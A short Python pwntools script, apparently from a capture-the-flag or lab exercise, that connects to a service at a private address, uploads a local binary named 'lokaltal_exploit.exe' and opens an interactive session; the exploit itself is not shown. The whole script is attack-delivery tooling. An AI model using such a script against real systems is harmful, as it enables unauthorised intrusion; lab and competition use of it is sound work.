#!/usr/bin/env python3
from pwn import *

t = remote("10.244.0.1", 1337)
p = Path("x64/Release/lokaltal_exploit.exe")
b = p.read_bytes()
t.sendafter(b'-'*3, p32(len(b))+b)
t.interactive()
